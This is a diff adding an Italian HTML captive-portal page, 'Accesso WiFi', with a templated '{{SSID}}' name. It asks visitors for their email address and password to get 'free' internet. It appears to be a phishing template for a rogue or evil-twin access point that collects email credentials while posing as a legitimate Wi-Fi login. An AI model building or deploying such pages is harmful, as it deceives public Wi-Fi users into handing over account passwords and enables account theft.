@@ -1,0 +1,33 @@
+<!doctype html>
+<html lang="it"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Accesso WiFi</title>
+<style>
+*{box-sizing:border-box;font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
+body{margin:0;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;
+align-items:center;justify-content:center;color:#fff;padding:16px}
+.card{background:#fff;color:#222;width:360px;max-width:94vw;border-radius:18px;padding:30px;
+box-shadow:0 14px 46px rgba(0,0,0,.4)}
+.logo{width:58px;height:58px;border-radius:16px;background:linear-gradient(135deg,#2a5298,#1e3c72);
+margin:0 auto 16px;display:flex;align-items:center;justify-content:center}
+.logo svg{width:32px;height:32px;fill:#fff}
+h1{font-size:21px;text-align:center;margin:0 0 4px}
+p.sub{text-align:center;color:#667;font-size:13px;margin:0 0 22px}
+label{display:block;font-size:12px;color:#556;margin:14px 0 5px;font-weight:600}
+input{width:100%;padding:13px 14px;border:1px solid #cdd5df;border-radius:11px;font-size:15px}
+input:focus{outline:none;border-color:#2a5298;box-shadow:0 0 0 3px rgba(42,82,152,.16)}
+button{width:100%;margin-top:22px;padding:14px;border:0;border-radius:11px;background:#2a5298;
+color:#fff;font-size:15px;font-weight:700;cursor:pointer}
+.legal{font-size:11px;color:#8a94a3;text-align:center;margin-top:18px;line-height:1.5}
+</style></head><body>
+<form class="card" method="POST" action="/login">
+<div class="logo"><svg viewBox="0 0 24 24"><path d="M12 4C7 4 2.7 6 0 9l2 2c2.3-2.4 6-4 10-4s7.7 1.6 10 4l2-2C21.3 6 17 4 12 4zm0 6c-3 0-5.6 1.2-7 3l2 2c1-1.3 3-2 5-2s4 .7 5 2l2-2c-1.4-1.8-4-3-7-3zm0 6l-2 2 2 2 2-2-2-2z"/></svg></div>
+<h1>Connetti a {{SSID}}</h1>
+<p class="sub">Accedi per navigare gratuitamente</p>
+<label>Indirizzo email</label>
+<input name="email" type="email" placeholder="nome@email.it" autocomplete="email" required>
+<label>Password</label>
+<input name="password" type="password" placeholder="Password" required>
+<button type="submit">Connettiti a Internet</button>
+<p class="legal">Continuando accetti i Termini di Servizio e l'Informativa Privacy del servizio Wi-Fi.</p>
+</form></body></html>
